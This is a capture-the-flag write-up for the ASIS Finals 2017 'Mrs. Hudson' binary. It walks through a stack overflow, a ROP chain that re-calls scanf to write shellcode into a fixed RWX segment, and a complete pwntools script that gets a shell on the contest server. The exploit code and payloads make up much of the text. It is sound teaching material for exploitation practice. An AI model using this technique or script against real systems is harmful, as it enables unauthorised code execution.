# Mrs. Hudson

This writeup is based off of this writeup: `https://github.com/bennofs/docs/blob/master/asisfinals-2017/mrshudson.py`

Let's take a look at the binary:

```
$	file mrs._hudson 
mrs._hudson: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a99b54f5a0f90ebade826e34188ac1f5eebb2cc7, not stripped
$	pwn checksec mrs._hudson 
[*] '/Hackery/asis/mycroft/mrs._hudson'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

So we can see that it is a 64 bit elf. We can also see that it doesn't have a stack canary, and it's stack is executable. Also we can see that it has `RWX` segements, which are segments of memory that we can read to, write to, and execute. Let's run the binary:

```
./mrs._hudson 
Let's go back to 2000.
here_is_some_input
```

So we can see that it prints out some text (related to the fact that this program doesn't have a canary or NX enabled), and then prompts for input. Let's try to break it!

```
python -c 'print "0"*200' | ./mrs._hudson 
Let's go back to 2000.
Segmentation fault (core dumped)
```

So we did cause a buffer overflow vulnerabillity. Let's look at the main function in IDA to get a better idea of how the program works.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rbp@0

  *(_DWORD *)(v3 - 116) = argc;
  *(_QWORD *)(v3 - 128) = argv;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("Let's go back to 2000.");
  return __isoc99_scanf("%s", v3 - 112);
}
```

So we can see here, it prints out the starting text and scans in all of our input without specifing how many characters. This is pretty much what we would expect to see. Let's use gdb to find out how much distance there is between the start of our input, and the RIP register:

```
gdb-peda$ b *0x400685
Breakpoint 1 at 0x400685
gdb-peda$ r
Starting program: /Hackery/asis/mycroft/mrs._hudson 
Let's go back to 2000.
15935728
```

once we reach the breakpoint:

```
Breakpoint 1, 0x0000000000400685 in main ()
gdb-peda$ find 15935728
Searching for '15935728' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0x7fffffffdef0 ("15935728")
gdb-peda$ i f
Stack level 0, frame at 0x7fffffffdf70:
 rip = 0x400685 in main; saved rip = 0x7ffff7a303f1
 called by frame at 0x7fffffffe030
 Arglist at 0x7fffffffdf60, args: 
 Locals at 0x7fffffffdf60, Previous frame's sp is 0x7fffffffdf70
 Saved registers:
  rbp at 0x7fffffffdf60, rip at 0x7fffffffdf68
```

let's calculate the offset:

```
>>> 0x7fffffffdf68 - 0x7fffffffdef0
120
```

So there are 120 bytes  between the start of our input, and the return address stored in the RIP register. So now that we have control over code flow execution, our next step is to figure out how to load shellcode into memory and run it. Let's take a look at the virtual memory, the RWX segments that we found earlier with the checksec might be of some use:

```
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/Hackery/asis/mycroft/mrs._hudson
0x00600000         0x00601000         r-xp	/Hackery/asis/mycroft/mrs._hudson
0x00601000         0x00602000         rwxp	/Hackery/asis/mycroft/mrs._hudson
0x00007ffff7a10000 0x00007ffff7bce000 r-xp	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7bce000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rwxp	mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007ffff7fd4000 0x00007ffff7fd6000 rwxp	mapped
0x00007ffff7ff5000 0x00007ffff7ff8000 rwxp	mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007ffff7ffe000 0x00007ffff7fff000 rwxp	mapped
0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```

So we can see a `rwx` segment that starts at `0x601000` and ends at `0x602000`. This is a segment of memory that has a static address, we can write  to it, and we can execute it. This is perfect for us. Since scanf is used by the program, we can just call that again to scan input into `0x601000`, with the input being shellcode. Then it would just be a matter of setting the return address to `0x601000` to run the shellcode.

The first thing we should grab in order to do this is a rop gadget. We need a ROP gadget that will pop a single argument into the rbp register (reason will become apparant soon), then return. In order to do this, we can use ROPgadget.

```
$	ROPgadget --binary mrs._hudson | less
```

Looking through the list of gadgets, we find one that we can use:

```
0x0000000000400575 : pop rbp ; ret
```

So now that we have our ROP gadget, the next thing we will need is the address we will use to call `scanf`. Now instead of just grabbing the address of scanf and using that, we will be using the assembly address which is where the code start preparing for the `scanf` call, so it will be less work for us. This address is `0x40066f`:

```
  40066f:       48 8d 45 90             lea    rax,[rbp-0x70]
  400673:       48 89 c6                mov    rsi,rax
  400676:       bf 2b 07 40 00          mov    edi,0x40072b
  40067b:       b8 00 00 00 00          mov    eax,0x0
  400680:       e8 9b fe ff ff          call   400520 <__isoc99_scanf@plt>
```

Now the last thing we will need is the address which we are going to write to, which we already have `0x601000`. We can see here that the address that is being written to is loaded from rbp-0x70 (reason why we needed it to be popped into the rbp register). Now if we just give it the address `0x601000`, because of the `-0x70` it will write to the address `0x601000 - 0x70` which will cause our exploit to fail. So we need to give it the address `0x601000 + 0x70` in order for it to work.

With all of that, we are left with this as our first payload which we will send:

```
#Establish the address needed
scanf  = 0x40066f
memory = 0x601000
gadget = 0x400575

#gdb.attach(target)

#Establish the first payload, and send it
payload0 = "0"*120 + p64(gadget) + p64(memory + 0x70) + p64(scanf)
target.sendline(payload0)
```

So the next step is just to send the program the shellcode, and then run it. When we start the scanf call via ROP, the start of our input is just 120 bytes away from the start of our input (and we have no limit as to the amount of characters we can write), we can just overwrite it and use it to jump to `0x601000`.  With this, we get our second payload:

```
#First import pwntools
from pwn import *

#Establish the target, and the context so the shellcode can be written
#target = process('./mrs._hudson')
target = remote('178.62.249.106', 8642)
context.binary = ELF('mrs._hudson')

#Read the first line of text
print target.recvline()

#Establish the address needed
scanf  = 0x40066f
memory = 0x601000
gadget = 0x400575

#gdb.attach(target)

#Establish the first payload, and send it
payload0 = "0"*120 + p64(gadget) + p64(memory + 0x70) + p64(scanf)
target.sendline(payload0)

#Establish the second payload, write the shellcode, and send it
payload1 = fit({0x0: asm(shellcraft.sh()), 0x78: p64(memory)})
target.sendline(payload1)

#Drop to an interactive shell, and enjoy /bin/sh
target.interactive()
```

and when we run it:

```
$	python exploit.py 
[+] Opening connection to 178.62.249.106 on port 8642: Done
[*] '/Hackery/asis/mycroft/mrs._hudson'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
Let's go back to 2000.

[*] Switching to interactive mode
$ w
 01:53:20 up 2 days, 17:29,  0 users,  load average: 110.00, 110.00, 110.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cd home
$ ls -asl
total 12
4 drwxr-xr-x  9 root root               4096 Sep  9 05:44 .
4 drwxr-xr-x 56 root root               4096 Sep 10 08:48 ..
4 drwxr-x---  2 root frontofficemanager 4096 Sep  9 05:44 frontofficemanager
$ cd frontofficemanager
$ ls -asl
total 36
 4 drwxr-x--- 2 root frontofficemanager 4096 Sep  9 05:44 .
 4 drwxr-xr-x 9 root root               4096 Sep  9 05:44 ..
 4 -rwxr-x--- 1 root frontofficemanager  220 Aug 31  2015 .bash_logout
 4 -rwxr-x--- 1 root frontofficemanager 3771 Aug 31  2015 .bashrc
 4 -rwxr-x--- 1 root frontofficemanager  655 May 16 12:49 .profile
 4 -r--r----- 1 root frontofficemanager   44 Sep  6 15:26 flag
12 -rwxr-x--- 1 root frontofficemanager 8544 Sep  9 05:22 hudson_3ab429dd29d62964e5596e6afe0d17d9
$ cat flag
ASIS{W3_Do0o_N0o0t_Like_M4N4G3RS_OR_D0_w3?}
```

Just like that, we captured the flag.

Thanks again to the writeup that this is based off of: ``https://github.com/bennofs/docs/blob/master/asisfinals-2017/mrshudson.py``
  
